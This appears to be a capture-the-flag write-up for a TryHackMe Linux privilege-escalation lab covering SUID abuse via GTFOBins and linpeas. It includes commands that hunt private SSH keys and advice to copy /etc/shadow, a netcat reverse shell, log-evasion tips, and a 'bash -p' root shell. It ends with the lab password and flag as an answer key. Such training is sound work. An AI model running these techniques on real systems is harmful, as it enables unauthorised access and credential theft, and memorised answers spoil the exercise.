DAY 11 - THE ROUGE GNOME [NETWORKING]
----

# STORY :
----

>>This is it - the moment that Elf McEager has been waiting for. It's the final exam of the Nmap course that he enlisted on during "Day 8 - What's Under the Christmas Tree?". It looks like all that hard work of hitting the books has paid off..."Success!" Elf McEager screams..."the exploit worked! Yippeee!"

>>Elf McEager has successfully managed to create a reverse shell from the target back to his computer. Little did he know, the real exam begins now...The last stage of the exam requires Elf McEager to escalate his privileges! He spent so much time studying Nmap cheatsheets that he's now drawing a blank...Can you help Elf McEager?

>>To be the good guy, sometimes you gotta be the bad guy first...

----

# Today's Learning Objectives:
----

>>We're going to be learning the fundamentals of privilege escalation, what it entails and how it is used day-to-day without you even realising in legitimate circumstances. 

>>After covering the fundamentals of Linux file permissions and understanding why we may want to escalate our privileges as a pentester, we're going to put our theory into practice by abusing a common file permission misconfiguration on Linux.

----

# What is Privilege Escalation?
----

>>You may be surprised to find out that privilege escalation is something that you do daily. On computing systems, there is a general rule of thumb that determines how someone interacts with a computer system and the resources within it. 
>>There are two primary levels of permissions that a person may have to a computer system:
  * User
  * Administrator

>>Generally speaking, only Administrators can modify system settings or change the permissions of other users resources like files and folders.

>>Users may be further divided into roles such as within a company. 
>>Staff in HR are only able to access HR documents whereas accounting staff are only able to access accounting resources.

>>Privilege escalation is simply the process of increasing the current privileges we have to permissions above us. 

>>As a pentester, we often want to escalate our privileges to that of another user or administrator to have full access to a system. We can discover and abuse misconfigurations or bugs within a system to escalate these privileges where this shouldn't be possible otherwise.

----

# The directions of privilege escalation
----

>>The process of escalating privileges isn't as clear-cut as going straight from a user through to administrator in most cases. 
>>Rather, slowly working our way through the resources and functions that other users can interact with.

----

## Horizontal Privilege Escalation:
----

>>A horizontal privilege escalation attack involves using the intended permissions of a user to abuse a vulnerability to access another user's resources who has similar permissions to you. 
>>For example, using an account with access to accounting documents to access a HR account to retrieve HR documents. 
>>As the difference in the permissions of both the Accounting and HR accounts is the data they can access, you aren't moving your privileges upwards.

----

## Vertical Privilege Escalation:
----

>>A bit more traditional, a vertical privilege escalation attack involves exploiting a vulnerability that allows you to perform actions like commands or accessing data acting as a higher privileged account such as an administrator.

>>Remember the attack you performed on "Day 1 - A Christmas Crisis"? 
>>You modified your cookie to access Santa's control panel. This is a fantastic example of a vertical privilege escalation because you were able to use your user account to access and manage the control panel. 
>>This control panel is only accessible by Santa (an administrator), so you are moving your permissions upwards in this sense.

----

# Reinforcing the Breach
----

>>A common issue you will face in offensive pentesting is instability. 
>>The very nature of some exploits relies on a heavy hand of luck and patience to work. 
>>Take for example the Eternalblue exploit which conducts a series of vulnerabilities in how the Windows OS allocates and manages memory. 
>>As the exploit writes to memory in an in-proper way, there is a chance of the computer crashing. 
>>We'll showcase a means of stabilising our connection in the section below.

>>Let's exploit a local copy of a DVWA (Damn Vulnerable Web App) and use a vulnerability called command injection to create a reverse connection to our device. 
>>Highlighted in red is the system command to utilise Netcat to connect back to our attacking machine:

>>Verifying a successful reverse connection, we execute two initial commands to get a bit of insight as to how we should progress:

>>Executing the 'whoami' command allows us to see what the name of the account that we are executing commands as. echo $0 informs us of our shell - it is currently a /bin/sh. 
>>This is a simple shell in comparison to a "/bin/bash". 
>>In shells like our current Netcat, we don't have many luxuries such as tab-completion and re-selecting the last command executed (using the up-arrow), but importantly, we can't use commands that ask for additional input i.e. providing SSH credentials or using the substitute user command su

>>Modern Ubuntu installs come with python3 installed, we can spawn another shell and begin to make it interactive:
python -c 'import pty; pty.spawn("/bin/bash")'

>>There are many ways you can make your shell interactive if Python is not installed.

----

# You Thought Enumeration Stopped at Nmap?
----

>>Wrong! We were just getting started. After gaining initial access, it's essential to begin to build a picture of the internals of the machine. We can look for a plethora of information such as other services that are running, sensitive data including passwords, executable scripts of binaries to abuse and more!

>>For example, we can use the find command to search for common folders or files that we may suspect to be on the machine:
   * backups
   * password
   * admin
   * config

>>Our vulnerable machine in this example has a directory called backups containing an SSH key that we can use for authentication. This was found via: find / -name id_rsa 2> /dev/null....Let's break this down:
  * We're using find to search the volume, by specifying the root (/) to search for files named "id_rsa" which is the name for private SSH keys, and then using 2> /dev/null to only show matches to us.

>>Can you think of any other files or folders we may want to find?

----

# The "Priv Esc Checklist"
----

>>As you progress through your pentesting journey, you will begin to pick up a certain workflow for how you approach certain stages of an engagement. Whilst this workflow is truly yours, it will revolve around some fundamental steps in looking for vulnerabilities for privilege escalation.

  * Determining the kernel of the machine (kernel exploitation such as Dirtyc0w)
  * Locating other services running or applications installed that may be abusable (SUID & out of date software)
  * Looking for automated scripts like backup scripts (exploiting crontabs)
  * Credentials (user accounts, application config files..)
  * Mis-configured file and directory permissions

>>Checkout some checklists that can be used as a cheatsheet for the enumeration stage of privilege escalation:

  * g0tmi1k
  * payatu
  * PayloadAllTheThings

----

# Vulnerability: SUID 101
----

>>For today's material, we're going to be showcasing the resource that is GTFOBins and explaining how the misconfigured permissions of applications can be exploited to escalate our privileges to an administrator.

>>Firstly, this begs the question...what is SUID exactly? 
>>Well, let's get on the same page by detailing how permissions work in Linux exactly. A benefit of Linux is its granularity in file permissions - they are, however, rather intimidating to approach. When performing commands like ls -l to list the permissions of our current directory:  

>>Our directory has three directories "exampledir[3]" and three files "examplefile[3]". I've listed the four columns of interest here:

COLUMN  	DESCRIPTION
[A]	        filetype (d is a directory - is a file) and the user and group permissions "r" for
		    reading, "w" for write and "x" for executing.
EXAMPLE :	A file with -rw-rw-r-- is read/write to the user and group only. However, every other 
			user has read access only

[B]			the user who owns the file
EXAMPLE :	cmnatic (system user)

[C]			the group (of users) who owns the file
EXAMPLE :	sudoers group

>>At the moment, the "examplefiles" are not executable as there is no "x" present for either the user or group. When setting the executable permission (chmod +x filename), this value changes (note the "x" in the snippet below -rwxrwxr):

```bash
-rwxrwxr-x 1 cmnatic cmnatic 0 Dec 8 18:43 backup.sh 
```

>>Normally, executables and commands (commands are just shortcuts to executables) will execute as the user who is running them (assuming they have the file permissions to do so.) This is why some commands such as changing a user's password require sudo in front of them. The sudo allows you to execute something with the permissions as root (the most privileged user). Users who can use sudo are called "sudoers" and are listed in /etc/sudoers (we can use this to help identify valuable users to us).

>>SUID is simply a permission added to an executable that does a similar thing as sudo. However, instead, allows users to run the executable as whoever owns it as demonstrated below:

Filename | File Owner | User who is executing the file | User that the file is executed as
ex1			root		cmnatic										root
ex2			cmnatic		cmnatic										cmnatic
ex3			service		danny										service

>>Suddenly with the introduction of SUID, users no longer have to be a sudoer to run an executable as root. This can be legitimately used to allow applications that specific privileges to run that another user can't have.

----

# Abusing SUID (GTFOBins)
----

>>Now that we understand why executables with this SUID permission are so enticing, let's begin to learn how to find these and understand the capabilities we can do with some of these executables. At the surface, SUID isn't inherently insecure. It's only when you factor in the misconfiguration of permissions (and given the complexity on Linux - is very easy to do); Administrators don't adhere to the rule of least privileges when troubleshooting.

>>Executables that are capable of interacting with the operating system such as reading/writing files or creating shells are goldmines for us. Thankfully, GTFOBins is a website that lists a majority of applications that do such actions for us. Let's set the SUID on the cp command that is used to copy files with 

```bash
chmod u+s /usr/bin/cp
```

>>Note how the cp executable is owned by "root" and now has the SUID permission set:

```bash
cmnatic@docker-ubuntu-s-1vcpu-1gb-lon1-01:~$ ls -al /usr/bin | grep "cp"
-rwsr-xr-x 1 root root 153976 Sep 5 2019 cp
```
>>The cp command will now be executed as root - meaning we can copy any file on the system. Some locations may be of interest to us:
   * copying the contents of other user directories (i.e. bash history, ssh keys, user.txt)
   * copying the contents of the "/root" directory (i.e. "/root/flag.txt")
   * copy the "/etc/passwd" & "/etc/shadow" files for password cracking

>>Let's confirm this by using find to search the machine for executables with the SUID permission set: 

```bash
find / -perm -u=s -type f 2>/dev/null
```
>>And now using cp to copy the contents of "/root" into our directory ("/home/cmnatic").

----

# Introducing Enumeration Scripts (Doing the leg work for us...)
----

>>Fortunately for us, there are many enumeration scripts available to use that automate some of the enumeration processes for us. We can download these onto our own machine and use a few methods to upload them to our vulnerable target instance. Bear in mind that vulnerable target Instances that you deploy on TryHackMe do not have internet access, so we must use our own attacking machine that is connected to the THM network.

>>A great script that is essential to anyone's toolkit is "LinEnum" that is available for download from here. LinEnum enumerates the target machine for us, detailing and collating useful information such as kernel versions, permissions to any executables or files that are outside of the users home directory - and a whole plethora more!

>>The problem with this? It's easy to get lost within it all. Enumeration scripts often return lots of information that is often not all that useful to us; It's important to understand how these enumeration scripts work so as not to rely on them. However, these scripts make privilege escalation that much more approachable for beginners.

 * Let's download the LinEnum script to our own machine using wget:

 * Let's use Python3 to turn our machine into a web server to serve the LinEnum.sh script to be downloaded onto the target machine. Make sure you run this command in the same directory that you downloaded LinEnum.sh to: 

 python3 -m http.server 8080

 * We need to upload this to the vulnerable Instance (MACHINE_IP) whilst ensuring that our own device is connected to the THM network. There are many ways this can be done which will depend on the vulnerable Instance you are attacking; the vulnerable Instance may not have tools such as wget, so alternatives will need to be used.

 * Navigate to a directory that we will have write permission to. The /tmp directory allows all users to write to it - so we will use this.

 * Using wget on the vulnerable Instance:

 * Using netcat:

 * Setup netcat on the vulnerable Instance to listen for an incoming file: nc -l -p 1337 > LinEnum.sh

 * Setup netcat on our own machine to send a file: nc -w -3 MACHINE_IP 1337 < LinEnum.sh

 * Add the execution permission to LinEnum.sh on the vulnerable Instance: chmod +x LinEnum.sh

 * Execute LinEnum.sh on the vulnerable Instance: ./LinEnum.sh

----

# Covering our Tracks
----

>>The final stages of penetration testing involve setting up persistence and covering our tracks. For today's material, we'll detail the later as this is not mentioned nearly enough.

>>During a pentesting engagement, you will want to try to avoid detection from the administrators & engineers of your client wherever within the permitted scope of the pentesting engagement. Activities such as logging in, authentication and uploading/downloading files are logged by services and the system itself.

>>On Debian and Ubuntu, the majority of these are left within the "/var/log directory and often require administrative privileges to read and modify. 
>>Some log files of interest:

```bash
   * "/var/log/auth.log" (Attempted logins for SSH, changes too or logging in as system users:)

   * "/var/log/syslog" (System events such as firewall alerts:)

   * "/var/log/<service/
For example, the access logs of apache2
/var/log/apache2/access.log"
```

----

# Challenge
----

>>Ensure that you have deployed the instance attached to this task and take note of the IP address (MACHINE_IP). Answer Question #1 and #2 before proceeding to log into the vulnerable instance. You have already been provided with the credentials to use to log into the vulnerable instance in Question #3.

>>Apply your newly found knowledge from this task to escalate your privileges! Study the hints carefully if needed - everything to complete this day has been discussed throughout today's task.

----

# MY DOCUMENTATION :
----

>>LOGIN IN TO THE SSH CONNECTION WITH THE GIVEN CREDS. 

```bash

root@ip-10-10-44-7:~# ssh cmnatic@10.10.250.63
The authenticity of host '10.10.250.63 (10.10.250.63)' can't be established.
ECDSA key fingerprint is SHA256:Epte0uGyoBmg5Gb9zRw9f26JYUHv72UFd1VVNHcItUQ.
Are you sure you want to continue connecting (yes/no)? YES
Warning: Permanently added '10.10.250.63' (ECDSA) to the list of known hosts.
cmnatic@10.10.250.63's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

68 packages can be updated.
0 updates are security updates.


Last login: Wed Dec  9 15:49:32 2020
-bash-4.4$ whoami
cmnatic
```

>>FINDING THE PERMISSION WITH THE "FIND" COMMAND AND IT'S OPERATOR 'perm' WHICH PERMISSION AND '-u' WHICH IS USER AND SET THE USER TO 's' WHICH REPRESENTS THE 'SETUID' AND 'SETGUID' MODES. AND SPECIFYING THE TYPE OF THE FILE 'f' AND REDIRECTING THE ERRORS TO DEVICE'S NULL AREA '2>/dev/null' .  

```bash
-bash-4.4$ find / -perm -u=s -type f 2>/dev/null
/bin/umount
/bin/mount
/bin/su
/bin/fusermount
/bin/bash
/bin/ping
/snap/core/10444/bin/mount
/snap/core/10444/bin/ping
/snap/core/10444/bin/ping6
/snap/core/10444/bin/su
/snap/core/10444/bin/umount
/snap/core/10444/usr/bin/chfn
/snap/core/10444/usr/bin/chsh
/snap/core/10444/usr/bin/gpasswd
/snap/core/10444/usr/bin/newgrp
/snap/core/10444/usr/bin/passwd
/snap/core/10444/usr/bin/sudo
/snap/core/10444/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/10444/usr/lib/openssh/ssh-keysign
/snap/core/10444/usr/lib/snapd/snap-confine
/snap/core/10444/usr/sbin/pppd
/snap/core/7270/bin/mount
/snap/core/7270/bin/ping
/snap/core/7270/bin/ping6
/snap/core/7270/bin/su
/snap/core/7270/bin/umount
/snap/core/7270/usr/bin/chfn
/snap/core/7270/usr/bin/chsh
/snap/core/7270/usr/bin/gpasswd
/snap/core/7270/usr/bin/newgrp
/snap/core/7270/usr/bin/passwd
/snap/core/7270/usr/bin/sudo
/snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7270/usr/lib/openssh/ssh-keysign
/snap/core/7270/usr/lib/snapd/snap-confine
/snap/core/7270/usr/sbin/pppd
/home/cmnatic/bash
/usr/bin/newgidmap
/usr/bin/at
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/newuidmap
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
```

>>TO FIND THE VULNERABLE AREA TO ESCALATE OUR PRIVELEGE WE 'linpeas' TOOL TO SEARCH.
>>THERE IS NO INTERNET ON THE TARGET MACHINE SO WE NEED TO SETUP THE PYTHON HTTPSERVER WITH THE FILE ON THE DIRECTORY.
>>AFTER STARTING THE SERVER.USE 'wget' TO DOWNLOAD THE FILE FROM OUR LOCAL MACHINE.THEN MAKE IT AS EXECUTABLE WITH 'chmod +x' COMMAND.
>>THEN EXECUTE IT .WITH THAT EXECUTION WE FOUND '/bin/bash' IS THE AREA VULNERABLE AND WE CAN USE IT TO EXECUTE AND ESCALATE OUR PRIVELEGE AS ROOT.
>>GO TO GTFOBin AND SEARCH FOR "bash" FIND THE SUID AREA.THERE IS A COMMAND 'bash -p'.
>>NOW EXECUTE THAT COMMAND THEN WE GOT OUR PRIVELEGE AS ROOT.   

```bash
root@ip-10-10-44-7:~/uploads# mv /opt/PEAS/linPEAS/linpeas.sh .
root@ip-10-10-44-7:~/uploads# python -m http.server 7777
Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
10.10.250.63 - - [08/Nov/2021 13:56:38] "GET /linpeas.sh HTTP/1.1" 200 -


-bash-4.4$ wget http://10.10.44.7:7777/linpeas.sh
--2021-11-08 13:56:38--  http://10.10.44.7:7777/linpeas.sh
Connecting to 10.10.44.7:7777... connected.
HTTP request sent, awaiting response... 200 OK
Length: 233380 (228K) [text/x-sh]
Saving to: \u2018linpeas.sh\u2019
linpeas.sh        100%[==========>] 227.91K  --.-KB/s    in 0.002s  

2021-11-08 13:56:38 (104 MB/s) - \u2018linpeas.sh\u2019 saved [233380/233380]
-bash-4.4$ ls
linpeas.sh
-bash-4.4$ chmod +x linpeas.sh 
-bash-4.4$ ls
linpeas.sh
-bash-4.4$ ./linpeas.sh 
bash-4.4$ bash -p
```

>>WITH THAT ROOT SHELL NAVIGATE TO THE ROOT DIRECTORY AND CAT THE FLAG.

```bash
bash-4.4# whoami
root
bash-4.4# cd /root
bash-4.4# ls
flag.txt
bash-4.4# cat flag.txt
thm{2fb10afe933296592}

```

----

# ANSWER THE FOLLOWING :
----

1.What type of privilege escalation involves using a user account to execute commands as an administrator?
>>vertical

2.What is the name of the file that contains a list of users who are a part of the sudo group?
>>sudoers

3.Use SSH to log in to the vulnerable machine like so: ssh cmnatic@MACHINE_IP
Input the following password when prompted: aoc2020
>>No answer needed

4.Enumerate the machine for executables that have had the SUID permission set. Look at the output and use a mixture of GTFObins and your researching skills to learn how to exploit this binary.
You may find uploading some of the enumeration scripts that were used during today's task to be useful.
>>No answer needed

5.Use this executable to launch a system shell as root.
What are the contents of the file located at /root/flag.txt?
>>thm{2fb10afe933296592}

----